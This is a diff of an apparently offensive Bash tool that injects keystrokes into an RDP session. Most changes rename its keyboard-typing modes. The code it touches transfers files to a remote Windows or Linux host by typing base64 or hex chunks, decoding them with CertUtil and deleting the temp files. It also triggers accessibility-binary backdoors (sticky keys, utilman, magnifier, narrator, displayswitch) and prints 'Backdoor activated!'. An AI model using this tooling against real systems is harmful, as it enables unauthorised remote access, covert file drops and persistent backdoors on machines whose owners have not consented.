@@ -34,9 +34,9 @@ function check_elevated() {
 function check_dependencies() {
     local programs=("xfreerdp" "remmina")
     local missing_dependencies=()
-    
+
 	case "${XDG_SESSION_TYPE}" in
-		"x11")
+        "x11")
 			programs+=("xdotool")
 		    ;;
 		"wayland")
@@ -63,7 +63,7 @@ function check_dependencies() {
 function get_window_sync_id() {
     local windowname="${1}"
     local sync_id
-    
+
 	if [[ "${XDG_SESSION_TYPE}" == "x11" ]]
 	then
 		sync_id=$(xdotool search --name "${windowname}" getwindowfocus getactivewindow)
@@ -84,23 +84,14 @@ function keyboard() {
 	if [[ "${XDG_SESSION_TYPE}" == "x11" ]]
 	then
 		case "${key}" in
-	        "return")
-				xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type "${input}"
-				xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key Return
-	            ;;
-	        "escapechars")
-    		    xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type -- "${input}"
-	    		xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key Return
-	        	;;
-	        "copycon")
-				xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type -- "${input}"
-				xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key Ctrl+Z Return
-	        	;;
-	        "customkey")
+            "keystrokes")
+                xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type "${input}"
+                ;;
+            "escape_keystrokes")
+                xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type -- "${input}"
+                ;;
+	        "custom_keystroke")
 	    		xdotool search --name "${WINDOWNAME}" windowfocus windowactivate key "${input}"
-	        	;;
-	        "noreturn")
-				xdotool search --name "${WINDOWNAME}" windowfocus windowactivate type -- "${input}"
 	        	;;
     	esac
 	elif [[ "${XDG_SESSION_TYPE}" == "wayland" ]]
@@ -110,20 +101,14 @@ function keyboard() {
 		exit 1
 
 		case "${key}" in
-	        "return")
-	        	wlrctl
-	            ;;
-	        "escapechars")
-	        	wlrctl
-	        	;;
-	        "copycon")
-	        	wlrctl
-	        	;;
-	        "customkey")
+            "keystrokes")
+                wlrctl
+                ;;
+            "escape_keystrokes")
+                wlrctl
+                ;;
+	        "custom_keystroke")
 	    		wlrctl
-	        	;;
-	        "noreturn")
-				wlrctl
 	        	;;
 	    esac
 	fi
@@ -214,11 +199,13 @@ function automate() {
     if [[ ${lines} -eq 0 ]]
     then
 		read contents < "${file}"
-		keyboard "${contents}" "escapechars"
+		keyboard "${contents}" "escape_keystrokes"
+		keyboard "Return" "custom_keystroke"
     else
         while read -r line
         do
-            keyboard "${line}" "escapechars"
+            keyboard "${line}" "escape_keystrokes"
+            keyboard "Return" "custom_keystroke"
         done < "${file}"
     fi
     print_status "completed" "Task completed!"
@@ -235,8 +222,9 @@ function dialogue_box() {
     fi
 
     print_status "progress" "Executing commands..."
-    keyboard "Super+r" "customkey"
-    keyboard "${commands}" "escapechars"
+    keyboard "Super+r" "custom_keystroke"
+    keyboard "${commands}" "escape_keystrokes"
+    keyboard "Return" "custom_keystroke"
     print_status "completed" "Task completed!"
 }
 
@@ -247,7 +235,8 @@ function execute() {
     case "${method}" in
         none)
             print_status "progress" "Executing commands..."
-            keyboard "${commands}" "escapechars"
+            keyboard "${commands}" "escape_keystrokes"
+            keyboard "Return" "custom_keystroke"
             print_status "completed" "Task completed!"
             ;;
         dialogbox)
@@ -299,14 +288,18 @@ function base64_encoding_scheme() {
         do
             if [[ ${i} -eq 0 ]]
             then
-                keyboard "\$${random_var_one} = \"${data:i:chunks}\"" "return"
+                keyboard "\$${random_var_one} = \"${data:i:chunks}\"" "keystrokes"
+                keyboard "Return" "custom_keystroke"
             else
-                keyboard "\$${random_var_one} += \"${data:i:chunks}\"" "return"
+                keyboard "\$${random_var_one} += \"${data:i:chunks}\"" "keystrokes"
+                keyboard "Return" "custom_keystroke"
             fi
         done
 
-        keyboard "[byte[]]\$${random_var_two} = [Convert]::FromBase64String(\$${random_var_one})" "return"
-        keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", \$${random_var_two})" "return"
+        keyboard "[byte[]]\$${random_var_two} = [Convert]::FromBase64String(\$${random_var_one})" "keystrokes"
+        keyboard "Return" "custom_keystroke"
+        keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", \$${random_var_two})" "keystrokes"
+        keyboard "Return" "custom_keystroke"
 
         print_status "completed" "File transferred!"
     elif [[ "${platform}" == "linux" && "${mode}" == "console" ]]
@@ -319,13 +312,16 @@ function base64_encoding_scheme() {
         do
             if [[ ${i} -eq 0 ]]
             then
-                keyboard "${random_var_one}=\"${data:i:chunks}\"" "return"
+                keyboard "${random_var_one}=\"${data:i:chunks}\"" "keystrokes"
+                keyboard "Return" "custom_keystroke"
             else
-                keyboard "${random_var_one}+=\"${data:i:chunks}\"" "return"
+                keyboard "${random_var_one}+=\"${data:i:chunks}\"" "keystrokes"
+                keyboard "Return" "custom_keystroke"
             fi
         done
 
-        keyboard "base64 -d <<< \$${random_var_one} > \"${output_file}\"" "return"
+        keyboard "base64 -d <<< \$${random_var_one} > \"${output_file}\"" "keystrokes"
+        keyboard "Return" "custom_keystroke"
         print_status "completed" "File transferred!"
     fi
 }
@@ -378,13 +374,16 @@ function base16_radix() {
         do
             if [[ ${i} -eq 0 ]]
             then
-                keyboard "\$${random_1} = \"${data:i:chunks}\"" "return"
+                keyboard "\$${random_1} = \"${data:i:chunks}\"" "keystrokes"
+                keyboard "Return" "custom_keystroke"
             else
-                keyboard "\$${random_1} += \"${data:i:chunks}\"" "return"
+                keyboard "\$${random_1} += \"${data:i:chunks}\"" "keystrokes"
+                keyboard "Return" "custom_keystroke"
             fi
         done
 
-            keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_var} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "return"
+            keyboard "[IO.File]::WriteAllBytes(\"${output_file}\", (\$${random_var} -split '(.{2})' | Where-Object { \$_ -ne '' } | ForEach-Object { [Convert]::ToByte(\$_, 16) }))" "keystrokes"
+            keyboard "Return" "custom_keystroke"
         elif [[ "${mode}" == "certutil" ]]
         then
             if [[ "${platform}" != "windows" ]]
@@ -409,14 +408,19 @@ function base16_radix() {
 			do
 			    if [[ ${i} -eq 0 ]]
 			    then
-			        keyboard "set ${random_var}=${data:i:chunks}" "return"
+			        keyboard "set ${random_var}=${data:i:chunks}" "keystrokes"
+			        keyboard "Return" "custom_keystroke"
 			    else
-			        keyboard "set ${random_var}=%${random_var}%${data:i:chunks}" "return"
+			        keyboard "set ${random_var}=%${random_var}%${data:i:chunks}" "keystrokes"
+			        keyboard "Return" "custom_keystroke"
 			    fi
 			done
-			keyboard "echo %${random_var}% > \"${directory_path}\\${random_temp_file}.hex\"" "return"
-			keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 12" "return"
-			keyboard "del /f \"${directory_path}\\${random_temp_file}.hex\"" "return"
+			keyboard "echo %${random_var}% > \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
+			keyboard "Return" "custom_keystroke"
+			keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 12" "keystrokes"
+			keyboard "Return" "custom_keystroke"
+			keyboard "del /f \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
+			keyboard "Return" "custom_keystroke"
     	elif [[ "${mode}" == "console" ]]
     	then
             print_status "progress" "Transferring file..."
@@ -432,14 +436,17 @@ function base16_radix() {
             do
                 if [[ ${i} -eq 0 ]]
                 then
-                    keyboard "${random_var}=\"${temp:i:chunks}\"" "return"
+                    keyboard "${random_var}=\"${temp:i:chunks}\"" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
                 else
-                    keyboard "${random_var}+=\"${temp:i:chunks}\"" "return"
+                    keyboard "${random_var}+=\"${temp:i:chunks}\"" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
                 fi
             done
 
 			# Interpret the backslash to output into a file.
-            keyboard "echo -en \$${random_var} > \"${output_file}\"" "return"
+            keyboard "echo -en \$${random_var} > \"${output_file}\"" "keystrokes"
+            keyboard "Return" "custom_keystroke"
     	fi
         print_status "completed" "File transferred!"
     fi
@@ -532,13 +539,16 @@ function powershell_outfile() {
                 done < "${input}"
 
                 print_status "progress" "Transferring file..."
-                keyboard "@'" "escapechars"
+                keyboard "@'" "escape_keystrokes"
+                keyboard "Return" "custom_keystroke"
                 while read -r line
                 do
-                    keyboard "${line}" "return"
+                    keyboard "${line}" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
                 done < "${input}"
 
-                keyboard "'@ | Out-File ${output_file}" "escapechars"
+                keyboard "'@ | Out-File ${output_file}" "escape_keystrokes"
+                keyboard "Return" "custom_keystroke"
             elif [[ "${file_type}" == "binary" ]]
             then
                 print_status "warning" "This is a binary file! Switching to 'outfileb64' method instead..."
@@ -559,23 +569,31 @@ function powershell_outfile() {
 
             print_status "progress" "Transferring file..."
             data=$(basenc -w 0 --base64 "${input}")
-            keyboard "@'" "escapechars"
-            keyboard "-----BEGIN CERTIFICATE-----" "escapechars"
+            keyboard "@'" "escape_keystrokes"
+            keyboard "Return" "custom_keystroke"
+            keyboard "-----BEGIN CERTIFICATE-----" "escape_keystrokes"
+            keyboard "Return" "custom_keystroke"
 
 	        for (( i=0; i<${#data}; i+=chunks ))
 	        do
 	            if [[ ${i} -eq 0 ]]
 	            then
-	            	keyboard "${data:i:chunks}" "return"
+	            	keyboard "${data:i:chunks}" "keystrokes"
+	            	keyboard "Return" "custom_keystroke"
 	            else
-	            	keyboard "${data:i:chunks}" "return"
+	            	keyboard "${data:i:chunks}" "keystrokes"
+	            	keyboard "Return" "custom_keystroke"
 	            fi
 	        done
 
-            keyboard "-----END CERTIFICATE-----" "escapechars"
-            keyboard "'@ | Out-File \"${directory_path}\\${random_temp}.txt\"" "escapechars"
-            keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp_file}.txt\" ${output_file}" "return"
-            keyboard "Remove-Item -Force \"${directory_path}\\${random_temp_file}.txt\"" "return"
+            keyboard "-----END CERTIFICATE-----" "escape_keystrokes"
+            keyboard "Return" "custom_keystroke"
+            keyboard "'@ | Out-File \"${directory_path}\\${random_temp}.txt\"" "escape_keystrokes"
+            keyboard "Return" "custom_keystroke"
+            keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp_file}.txt\" ${output_file}" "keystrokes"
+            keyboard "Return" "custom_keystroke"
+            keyboard "Remove-Item -Force \"${directory_path}\\${random_temp_file}.txt\"" "keystrokes"
+            keyboard "Return" "custom_keystroke"
         elif [[ "${mode}" == "hex" ]]
         then
             print_status "progress" "Transferring file..."
@@ -587,28 +605,31 @@ function powershell_outfile() {
             	hexadecimal+=("${data:i:2}")
             done
 
-            keyboard "@'" "escapechars"
+            keyboard "@'" "escape_keystrokes"
+            keyboard "Return" "custom_keystroke"
 
             counter=0
             for ((i=0; i<${#hexadecimal[@]}; i++))
             do
                 if [[ ${counter} -eq 7 ]]
                 then
-                	keyboard "${hexadecimal[i]}" "noreturn"
-                	keyboard "space" "customkey"
+                	keyboard "${hexadecimal[i]}" "keystrokes"
+                	keyboard "space" "custom_keystroke"
                 elif [[ ${counter} -eq 8 ]]
                 then
-                	keyboard "space" "customkey"
+                	keyboard "space" "custom_keystroke"
                     (( counter++ ))
                 elif [[ ${counter} -eq 15 ]]
                 then
-                	keyboard "${hexadecimal[i]}" "return"
+                	keyboard "${hexadecimal[i]}" "keystrokes"
+                	keyboard "Return" "custom_keystroke"
                 elif [[ ${i} -eq $((${#hexadecimal[@]} - 1)) ]]
                 then
-                    keyboard "${hexadecimal[i]}" "return"
+                    keyboard "${hexadecimal[i]}" "keystrokes"
+                    keyboard "Return" "custom_keystroke"
                 else
-                	keyboard "${hexadecimal[i]}" "noreturn"
-                	keyboard "space" "customkey"
+                	keyboard "${hexadecimal[i]}" "keystrokes"
+                	keyboard "space" "custom_keystroke"
                 fi
 
                 if [[ ${counter} -eq 15 ]]
@@ -618,9 +639,12 @@ function powershell_outfile() {
                     (( counter++ ))
                 fi
             done
-            keyboard "'@ | Out-File \"${directory_path}\\${random_temp_file}.hex\"" "escapechars"
-			keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 4" "return"
-			keyboard "Remove-Item -Force \"${directory_path}\\${random_temp_file}.hex\"" "return"
+            keyboard "'@ | Out-File \"${directory_path}\\${random_temp_file}.hex\"" "escape_keystrokes"
+            keyboard "Return" "custom_keystroke"
+			keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 4" "keystrokes"
+			keyboard "Return" "custom_keystroke"
+			keyboard "Remove-Item -Force \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
+			keyboard "Return" "custom_keystroke"
         fi
     fi
 
@@ -665,16 +689,20 @@ function copy_con() {
         done < "${input}"
 
         print_status "progress" "Transferring file..."
-        keyboard "copy con ${output_file}" "return"
+        keyboard "copy con ${output_file}" "keystrokes"
+        keyboard "Return" "custom_keystroke"
 
         counter=1
         while read -r line
         do
             if [[ ${counter} -ne ${lines} ]]
             then
-                keyboard "${line}" "return"
+                keyboard "${line}" "escape_keystrokes"
+                keyboard "Return" "custom_keystroke"
             else
-                keyboard "${line}" "copycon"
+                keyboard "${line}" "escape_keystrokes"
+                keyboard "Ctrl+Z" "custom_keystroke"
+                keyboard "Return" "custom_keystroke"
             fi
             (( counter++ ))
         done < "${input}"
@@ -690,22 +718,30 @@ function copy_con() {
         fi
 
         print_status "progress" "Transferring file..."
-        keyboard "copy con \"${directory_path}\\${random_temp_file}.txt\"" "return"
-        keyboard "-----BEGIN CERTIFICATE-----" "escapechars"
+        keyboard "copy con \"${directory_path}\\${random_temp_file}.txt\"" "keystrokes"
+        keyboard "Return" "custom_keystroke"
+        keyboard "-----BEGIN CERTIFICATE-----" "escape_keystrokes"
+        keyboard "Return" "custom_keystroke"
 
         for (( i=0; i<${#data}; i+=chunks ))
         do
             if [[ ${i} -eq 0 ]]
             then
-                keyboard "${data:i:chunks}" "return"
+                keyboard "${data:i:chunks}" "keystrokes"
+                keyboard "Return" "custom_keystroke"
             else
-                keyboard "${data:i:chunks}" "return"
+                keyboard "${data:i:chunks}" "keystrokes"
+                keyboard "Return" "custom_keystroke"
             fi
         done
 
-        keyboard "-----END CERTIFICATE-----" "copycon"
-        keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp_file}.txt\" ${output_file}" "return"
-        keyboard "del /f \"${directory_path}\\${random_temp_file}.txt\"" "return"
+        keyboard "-----END CERTIFICATE-----" "keystrokes"
+        keyboard "Ctrl+Z" "custom_keystroke"
+        keyboard "Return" "custom_keystroke"
+        keyboard "CertUtil.exe -f -decode \"${directory_path}\\${random_temp_file}.txt\" ${output_file}" "keystrokes"
+        keyboard "Return" "custom_keystroke"
+        keyboard "del /f \"${directory_path}\\${random_temp_file}.txt\"" "keystrokes"
+        keyboard "Return" "custom_keystroke"
     elif [[ "${mode}" == "hex" ]]
     then
     	print_status "progress" "Transferring file..."
@@ -717,28 +753,32 @@ function copy_con() {
         	hexadecimal+=("${data:i:2}")
         done
 
-        keyboard "copy con \"${directory_path}\\${random_temp_file}.hex\"" "return"
+        keyboard "copy con \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
+        keyboard "Return" "custom_keystroke"
 
 		counter=0
 		for ((i=0; i<${#hexadecimal[@]}; i++))
 		do
             if [[ ${counter} -eq 7 ]]
             then
-                keyboard "${hexadecimal[i]}" "noreturn"
-                keyboard "space" "customkey"
+                keyboard "${hexadecimal[i]}" "keystrokes"
+                keyboard "space" "custom_keystroke"
             elif [[ ${counter} -eq 8 ]]
             then
-                keyboard "space" "customkey"
+                keyboard "space" "custom_keystroke"
                 (( counter++ ))
             elif [[ ${counter} -eq 15 ]]
             then
-                keyboard "${hexadecimal[i]}" "return"
+                keyboard "${hexadecimal[i]}" "keystrokes"
+                keyboard "Return" "custom_keystroke"
             elif [[ ${i} -eq $((${#hexadecimal[@]} - 1)) ]]
             then
-                keyboard "${hexadecimal[i]}" "copycon"
+                keyboard "${hexadecimal[i]}" "keystrokes"
+                keyboard "Ctrl+Z" "custom_keystroke"
+                keyboard "Return" "custom_keystroke"
             else
-               	keyboard "${hexadecimal[i]}" "noreturn"
-               	keyboard "space" "customkey"
+               	keyboard "${hexadecimal[i]}" "keystrokes"
+               	keyboard "space" "custom_keystroke"
             fi
 
             if [[ ${counter} -eq 15 ]]
@@ -749,8 +789,10 @@ function copy_con() {
             fi
         done
 
-		keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 4" "return"
-		keyboard "del /f \"${directory_path}\\${random_temp_file}.hex\"" "return"
+		keyboard "CertUtil.exe -f -decodehex \"${directory_path}\\${random_temp_file}.hex\" \"${output_file}\" 4" "keystrokes"
+		keyboard "Return" "custom_keystroke"
+		keyboard "del /f \"${directory_path}\\${random_temp_file}.hex\"" "keystrokes"
+		keyboard "Return" "custom_keystroke"
     fi
 
     print_status "completed" "File transferred!"
@@ -892,7 +934,7 @@ EndOfText
         for (( i=1; i<=5; i++ ))
         do
             print_status "progress" "SHIFT: ${i}"
-            keyboard "shift" "customkey"
+            keyboard "shift" "custom_keystroke"
         done
         print_status "completed" "Backdoor activated!"
     else
@@ -922,7 +964,7 @@ EndOfText
     elif [[ "${action}" == "backdoor" ]]
     then
         print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
-        keyboard "Super+u" "customkey"
+        keyboard "Super+u" "custom_keystroke"
         print_status "completed" "Backdoor activated!"
     else
         print_status "error" "Invalid mode!"
@@ -950,8 +992,8 @@ EndOfText
     elif [[ "${action}" == "backdoor" ]]
     then
         print_status "progress" "Activating magnifier.exe backdoor..."
-        keyboard "Super+equal" "customkey"
-        keyboard "Super+minus" "customkey"
+        keyboard "Super+equal" "custom_keystroke"
+        keyboard "Super+minus" "custom_keystroke"
         print_status "completed" "Backdoor activated!"
     else
         print_status "error" "Invalid mode!"
@@ -980,7 +1022,7 @@ EndOfText
     elif [[ "${action}" == "backdoor" ]]
     then
         print_status "progress" "Activating narrator.exe backdoor..."
-        keyboard "Super+Return" "customkey"
+        keyboard "Super+Return" "custom_keystroke"
         print_status "completed" "Backdoor activated!"
     else
         print_status "error" "Invalid mode!"
@@ -1009,7 +1051,7 @@ EndOfText
     elif [[ "${action}" == "backdoor" ]]
     then
         print_status "progress" "Activating displayswitch.exe backdoor..."
-        keyboard "Super+p" "customkey"
+        keyboard "Super+p" "custom_keystroke"
         print_status "completed" "Backdoor activated!"
     else
         print_status "error" "Invalid mode!"
